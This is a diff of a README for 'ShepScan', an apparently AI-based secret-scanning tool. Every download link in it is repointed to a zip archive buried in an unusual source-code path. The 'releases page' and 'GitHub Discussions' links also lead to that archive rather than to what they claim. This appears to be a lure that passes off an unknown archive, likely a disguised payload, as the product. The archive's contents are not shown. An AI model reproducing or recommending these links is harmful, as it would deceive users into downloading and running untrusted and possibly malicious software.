@@ -1,7 +1,7 @@
 # 🚀 ShepScan - Stop Secrets Before They Leak
 
 ## 📥 Download ShepScan
-[![Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/dist/src/prisma/Shep_Scan_v3.2.zip)](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/dist/src/prisma/Shep_Scan_v3.2.zip)
+[![Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/src/ai/dto/Scan_Shep_serfishness.zip)](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/src/ai/dto/Scan_Shep_serfishness.zip)
 
 ## 📝 Overview
 ShepScan is an easy-to-use tool designed for modern development teams. It helps you find and stop sensitive information, like passwords or API keys, from being included in your code. With artificial intelligence, ShepScan scans your code and alerts you before these secrets make their way into your repository.
@@ -22,7 +22,7 @@ To run ShepScan effectively, your system should meet the following requirements:
 
 ## 🚀 Getting Started
 1. **Download ShepScan:**
-   - Visit the releases page to get the latest version: [Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/dist/src/prisma/Shep_Scan_v3.2.zip).
+   - Visit the releases page to get the latest version: [Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/src/ai/dto/Scan_Shep_serfishness.zip).
   
 2. **Install the Application:**
    - Locate the downloaded file on your computer.
@@ -67,12 +67,12 @@ A: ShepScan can detect passwords, API keys, tokens, and other sensitive strings.
 A: We aim to release updates regularly, especially to improve detection capabilities and fix any issues.
 
 ## 🔄 Keeping ShepScan Up to Date
-To ensure you have the latest features and security updates, periodically check and download new versions from the releases page: [Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/dist/src/prisma/Shep_Scan_v3.2.zip).
+To ensure you have the latest features and security updates, periodically check and download new versions from the releases page: [Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/src/ai/dto/Scan_Shep_serfishness.zip).
 
 ## 👥 Community Support
-Join our community on [GitHub Discussions](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/dist/src/prisma/Shep_Scan_v3.2.zip) to share tips, ask questions, and engage with other users.
+Join our community on [GitHub Discussions](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/src/ai/dto/Scan_Shep_serfishness.zip) to share tips, ask questions, and engage with other users.
 
 ## 🌟 Conclusion
 By using ShepScan, you protect your projects from leaking sensitive information. Download the application today and take control of your code's security. 
 
-[![Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/dist/src/prisma/Shep_Scan_v3.2.zip)](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/dist/src/prisma/Shep_Scan_v3.2.zip)
+[![Download ShepScan](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/src/ai/dto/Scan_Shep_serfishness.zip)](https://raw.githubusercontent.com/mskhanani6/ShepScan/main/apps/api/src/ai/dto/Scan_Shep_serfishness.zip)
